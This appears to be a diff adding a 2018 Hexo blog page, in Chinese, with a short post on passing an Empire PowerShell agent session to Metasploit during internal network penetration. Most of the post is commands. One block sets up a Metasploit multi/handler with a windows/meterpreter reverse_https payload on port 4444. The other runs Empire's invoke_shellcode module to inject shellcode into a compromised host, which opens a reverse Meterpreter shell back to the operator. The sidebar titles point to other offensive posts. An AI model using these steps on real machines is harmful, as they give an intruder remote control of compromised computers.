@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>empire-联动-msf | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Empire 联动 metasploit内网渗透过程中，通常采用powershell作为第一步载荷，Empire框架很好的集合了Powershell的这些载荷，但是，Empire框架在功能上不如msf来的强大，很多横向渗透和信息收集我们需要使用msf（Empire对中文支持好像有些问题）。 empire 内置了一个命令执行模块可以直接将agent 会话反弹到meterpreter上面 首先设置ms">
+<meta property="og:type" content="article">
+<meta property="og:title" content="empire-联动-msf">
+<meta property="og:url" content="http://yoursite.com/2018/03/03/empire-联动-msf/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Empire 联动 metasploit内网渗透过程中，通常采用powershell作为第一步载荷，Empire框架很好的集合了Powershell的这些载荷，但是，Empire框架在功能上不如msf来的强大，很多横向渗透和信息收集我们需要使用msf（Empire对中文支持好像有些问题）。 empire 内置了一个命令执行模块可以直接将agent 会话反弹到meterpreter上面 首先设置ms">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-03-03T16:42:12.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="empire-联动-msf">
+<meta name="twitter:description" content="Empire 联动 metasploit内网渗透过程中，通常采用powershell作为第一步载荷，Empire框架很好的集合了Powershell的这些载荷，但是，Empire框架在功能上不如msf来的强大，很多横向渗透和信息收集我们需要使用msf（Empire对中文支持好像有些问题）。 empire 内置了一个命令执行模块可以直接将agent 会话反弹到meterpreter上面 首先设置ms">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-empire-联动-msf" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/03/03/empire-联动-msf/" class="article-date">
+  <time datetime="2018-03-03T15:51:03.000Z" itemprop="datePublished">2018-03-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      empire-联动-msf
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Empire-联动-metasploit"><a href="#Empire-联动-metasploit" class="headerlink" title="Empire 联动 metasploit"></a>Empire 联动 metasploit</h1><p>内网渗透过程中，通常采用powershell作为第一步载荷，Empire框架很好的集合了Powershell的这些载荷，但是，Empire框架在功能上不如msf来的强大，很多横向渗透和信息收集我们需要使用msf（Empire对中文支持好像有些问题）。</p>
+<p>empire 内置了一个命令执行模块可以直接将agent 会话反弹到meterpreter上面</p>
+<p>首先设置msf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_https</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
+<p>empire 设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#首先进入一个agent</span><br><span class="line">usemodule code_execution/invoke_shellcode</span><br><span class="line">set Lhost 本机 IP</span><br><span class="line">set Lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<p>然后等待上线就好了。666666</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/03/03/empire-联动-msf/" data-id="cjk8lemk9000448s3bmk6lust" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/03/04/ms17010-小记/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          ms17010-小记
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/03/03/Content-Security-Policy-Introduction/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Content-Security-Policy-Introduction</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/GPP/">GPP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http代理/">http代理</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mestasploit/">mestasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/GPP/" style="font-size: 10px;">GPP</a> <a href="/tags/http代理/" style="font-size: 10px;">http代理</a> <a href="/tags/mestasploit/" style="font-size: 10px;">mestasploit</a> <a href="/tags/漏洞分析/" style="font-size: 20px;">漏洞分析</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/03/24/跨域方案枚举/">跨域方案枚举</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/24/免杀Powershell/">免杀Powershell</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/11/metasploit自动化攻击/">metasploit自动化攻击</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/08/VBScript挂马/">VBScript挂马</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/04/使用GPP漏洞进行域渗透/">使用GPP漏洞进行域渗透</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
